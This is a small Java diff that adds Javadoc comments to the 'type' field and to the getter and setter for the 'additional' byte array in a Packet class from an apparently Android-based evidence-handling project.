@@ -16,6 +16,7 @@ import com.ht.RCSAndroidGUI.evidence.EvidenceType;
  */
 public class Packet {
 
+	/** The type. */
 	EvidenceType type;
 
 	/** The priority. */
@@ -129,10 +130,20 @@ public class Packet {
 		return data;
 	}
 
+	/**
+	 * Gets the additional.
+	 *
+	 * @return the additional
+	 */
 	public byte[] getAdditional() {
 		return additional;
 	}
 
+	/**
+	 * Sets the additional.
+	 *
+	 * @param d the new additional
+	 */
 	public void setAdditional(final byte[] d) {
 		additional = d;
 	}
